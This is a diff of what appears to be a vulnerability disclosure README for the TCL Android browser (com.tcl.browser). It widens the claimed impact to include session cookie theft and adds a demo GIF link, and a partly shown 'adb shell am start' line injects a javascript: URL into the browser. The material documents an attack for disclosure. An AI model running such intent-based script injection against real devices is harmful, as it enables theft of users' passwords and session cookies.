@@ -36,7 +36,7 @@ This vulnerability is particularly concerning because:
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/poc.gif)
 
-These ADB commands inject JavaScript to extract password data* & can be accomplished without ADB with no permissions.
+These ADB commands inject JavaScript to extract password data & browser session cookie & can be accomplished without ADB with no permissions.
 
 
 ```bash
@@ -57,6 +57,12 @@ adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bva
 Google.com
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)
+
+Session Cookie Theft: 
+![image](https://github.com/actuator/com.tcl.browser/blob/main/cookie.gif)
+
+
+
 
 
 
